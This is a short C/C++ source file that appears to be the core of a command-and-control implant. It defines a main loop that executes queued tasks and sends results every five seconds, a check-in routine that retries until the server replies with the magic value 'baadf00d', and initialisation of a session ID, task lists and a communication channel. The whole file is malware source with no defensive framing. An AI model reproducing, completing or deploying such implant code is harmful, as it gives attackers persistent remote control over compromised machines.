#include "Implant.h"

IImplant g_Implant;

/*
 * @brief Main loop for executing and sending tasks
 */
VOID ImplantLoop() {
    while (1) {
        ImplantExecute( MAX_TASK_EXECUTE_COUNT );
        ImplantSendTasks( MAX_TASK_SEND_COUNT );
        Sleep( 5000 );
    }
}

/*
 * @brief Send checkin request
 */
VOID ImplantRegister() {
    json   checkin;
    json   response;
    string magic;

    while (1) {

        Sleep( 5000 );

        if (!ImplantSendCheckin( checkin, response )) {
            continue;
        }

        magic = response["magic"].get<string>();
        if (!magic.compare( "baadf00d" ))
            return;
    }
}

/*
 * @brief Initialize implant object
 */
BOOL ImplantInitialize() {
    g_Implant.SessionID = RandomUint32();

    InitializeListHead( &g_Implant.JobList );
    InitializeListHead( &g_Implant.TaskRequestList );
    InitializeListHead( &g_Implant.TaskResponseList );

    if (!ChannelInitialize()) {
        return FALSE;
    }

    return TRUE;
}
